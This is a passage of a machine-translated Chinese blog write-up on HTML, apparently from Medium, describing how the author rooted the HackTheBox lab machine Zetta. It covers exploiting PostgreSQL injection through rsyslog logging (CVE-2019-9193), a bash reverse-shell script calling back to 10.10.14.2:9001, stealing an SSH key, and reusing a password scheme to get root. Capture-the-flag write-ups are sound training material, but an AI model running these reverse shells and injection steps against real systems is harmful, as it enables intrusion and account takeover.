src="../Images/97eca5658035d46f96442a531a3f23ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1214/format:webp/1*ZwIJNl1XJkx_wD2Mxp0gbA.png"/></div></figure><p id="0618" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我拿了一份，用浏览器打开了它。其中提到Roy还没有完成对rsyncd.conf的返工，这就是/etc可以访问的原因。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi pb"><img src="../Images/33c9fa4cc64e34a5bc994509da585fbe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1256/format:webp/1*mFe7_zYDrtdR5x9zq7VuUg.png"/></div></figure><p id="b80b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还有一个部分表明他正在使用rsyslog，并且日志正在被推送到DB。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi pc"><img src="../Images/1e2b5b3e259e423a0765d9dfc70872d9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1302/format:webp/1*hYLN1JoyEwPajs5iRWLZlQ.png"/></div></figure><p id="74b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">远在下面，它提到Roy需要改变共享密码方案。目前其<secrer> @userid。</secrer></p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi pd"><img src="../Images/5d977a90e64eca83eb528d73b0726c64.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dbMyFaW5F2aSWImeCj2RtA.png"/></div></div></figure><p id="ee08" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Roy还在/rsyncd.conf中提到要排除。rsync中/etc列表中的git:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oq"><img src="../Images/54ef43c0247a915fe48a20abf99b839c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WIXcHaMi24Eswb2XuQM59A.png"/></div></div></figure><p id="b00d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">知道可能有git文件夹，这非常有趣，我尝试使用find命令来寻找它们:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="3d77" class="mg kz iq mc b gy mh mi l mj mk">find / -name ".git" -type d 2&gt;/dev/null</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi pe"><img src="../Images/06f93fca2d443178d98c247ec20c6df8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1008/format:webp/1*obs_RkMdu-ijjKa9PM4NNA.png"/></div></figure><p id="865d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">出现了3个git文件夹。所有这些服务在tudu.xml中都有提到，检查rsyslog.d下的文件，有一个配置文件我看不懂。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi pf"><img src="../Images/d375b6dca618a66b4f1b73dcae2b0991.png" data-original-src="https://miro.medium.com/v2/resize:fit:1028/format:webp/1*eMmvuNAmiOHnIBzMQ0vBwQ.png"/></div></figure><p id="26d5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在处理git回购时，我的第一个检查是检查提交:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="41a4" class="mg kz iq mc b gy mh mi l mj mk">git log -p </span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi pg"><img src="../Images/eb5b5ebe0b5a071f93992b4701b97186.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zYuGP2ni-m48ASgMpEPZZQ.png"/></div></div></figure><p id="aef5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">commit显示了对pgsql.conf .所做的更改，指明了creds(它们在其他地方不起作用)以及如何将日志推送到Postgre的模板。所有线索都指向使用日志的Postgre注射。我检查了postgreql主日志的内容，并尝试使用logger命令生成一些日志:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="6bff" class="mg kz iq mc b gy mh mi l mj mk">watch -n 1 cat postgresql-11-main.log</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi ph"><img src="../Images/ef5085730b7457b5aa5802ce8dcecd5c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3dUGV0gmiBzCWjV2GLby6w.png"/></div></div></figure><p id="1800" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我知道试着玩伐木:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi pi"><img src="../Images/4ff76fef5a292f74fe857672574e138f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_y_L4pAfScsDdTYt-6oIMQ.png"/></div></div></figure><p id="4cc5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看到我得到一个语法错误，我查看了Postgre注入备忘单，发现这个漏洞正在工作:</p><div class="pj pk gp gr pl pm"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution" rel="noopener  ugc nofollow" target="_blank"><div class="pn ab fo"><div class="po ab pp cl cj pq"><h2 class="bd ir gy z fp pr fr fs ps fu fw ip bi translated">swisskyrepo/payloads all things</h2><div class="pt l"><h3 class="bd b gy z fp pr fr fs ps fu fw dk translated">选择用户；选择当前用户；选择会话_用户；从pg_user中选择usenameSELECT getpgusername()；选择…</h3></div><div class="pu l"><p class="bd b dl z fp pr fr fs ps fu fw dk translated">github.com</p></div></div><div class="pv l"><div class="pw l px py pz pv qa ks pm"/></div></div></a></div><p id="34ad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">CVE的详细资料提到“<a class="ae kl" href="https://nvd.nist.gov/vuln/detail/CVE-2019-9193" rel="noopener ugc nofollow" target="_blank">在PostgreSQL 9.3到11.2中，“复制到程序/从程序复制”功能允许超级用户和‘pg _ execute _ server _ PROGRAM’组中的用户在数据库操作系统用户的上下文中执行任意代码。</a>“Postgres对此有争议，但尽管如此，它是可行的。</p><p id="5213" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我创建了一个文件，内容如下:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="063a" class="mg kz iq mc b gy mh mi l mj mk">#!/bin/bash</span><span id="ea1a" class="mg kz iq mc b gy ml mi l mj mk">bash -i &gt;&amp; /dev/tcp/10.10.14.2/9001 0&gt;&amp;1</span></pre><p id="d6a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">并使用scp将它放在tmp目录下:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="c7aa" class="mg kz iq mc b gy mh mi l mj mk">scp -i sifo-ssh rev.sh roy@10.10.10.156:/tmp/</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi pb"><img src="../Images/2b5bad7f85d5270c7467ec621742e0fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1256/format:webp/1*hEwC3kjJrTfcokSJJiHjfw.png"/></div></figure><p id="39c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在弄清楚如何让感染工作之后，我以postgres用户的身份获得了一个shell。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi qb"><img src="../Images/265e65632990a951a7d3c1a558f62dae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WP2GpFcdZubiQw6GauYRmA.png"/></div></div></figure><p id="511e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">列出文件，我看到一个psql_history文件和。ssh目录:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi qc"><img src="../Images/bebb909c114b290d7243fbf2dc4fcbd1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*66Yrur4hjaJDdAdCRXYArA.png"/></div></div></figure><p id="36c3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">psql_history文件的内容包含一个修改用户postrgres密码的sql:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi qd"><img src="../Images/a03fc75042e5205f6bf0fb2a4d0d82ed.png" data-original-src="https://miro.medium.com/v2/resize:fit:1188/format:webp/1*ZrReKbCrLMYRPxXdE-bOTg.png"/></div></figure><p id="b1ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我还抢到了用户postgres的私钥。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi qd"><img src="../Images/14ac39c433659c5c211ded235e524f28.png" data-original-src="https://miro.medium.com/v2/resize:fit:1188/format:webp/1*WHhE8zeHy6V_IyKZvUovCw.png"/></div></figure><p id="2a77" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我现在可以直接以用户postgres的身份登录。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi qe"><img src="../Images/b09063a1a4b88188961b59e00920929b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4_1y7O-UhV55mcjt7EQ3bA.png"/></div></div></figure><p id="bdec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请记住，在待办事项列表中，更改共享密码方案还没有完成。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi qf"><img src="../Images/33dd1feb3635ef9ac29035f4e5cf612e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ltMDg94DJW9FVc-OA3maHA.png"/></div></div></figure><p id="4e11" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于用户重复使用密码是很常见的，所以我使用了密码方案<secret> @userid作为root登录:</secret></p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="b3ac" class="mg kz iq mc b gy mh mi l mj mk">sup3rs3cur3p4ass@root</span></pre><p id="280f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我现在是root，可以读取root.txt:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi qg"><img src="../Images/0816e05210cc54bcb4f03ff7515d0ac0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1014/format:webp/1*twWXG1TwxSmy2x0HWlpD2g.png"/></div></figure><p id="8b9d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这也可以直接从roy ssh会话中完成。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi qh"><img src="../Images/33fe9213ce9b567f607679f90ea8e325.png" data-original-src="https://miro.medium.com/v2/resize:fit:702/format:webp/1*MKMFwv6NT2PvbmFAP6y-5Q.png"/></div></figure><p id="b2e1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这就是我如何从HacktheBox解决Zetta的！这是一个非常漫长的旅程，但绝对值得！感谢阅读！🍺</p></div><div class="ab cl qi qj hu qk" role="separator"><span class="ql bw bk qm qn qo"/><span class="ql bw bk qm qn qo"/><span class="ql bw bk qm qn"/></div><div class="ij ik il im in"><p id="5798" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nm">关注</em> <a class="ae kl" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="nm"> Infosec报道</em> </a> <em class="nm">获取更多此类精彩报道。</em></p><div class="pj pk gp gr pl pm"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="pn ab fo"><div class="po ab pp cl cj pq"><h2 class="bd ir gy z fp pr fr fs ps fu fw ip bi translated">信息安全报道</h2><div class="pt l"><h3 class="bd b gy z fp pr fr fs ps fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="pu l"><p class="bd b dl z fp pr fr fs ps fu fw dk translated">medium.com</p></div></div><div class="pv l"><div class="qp l px py pz pv qa ks pm"/></div></div></a></div></div></div>    
</body>
</html>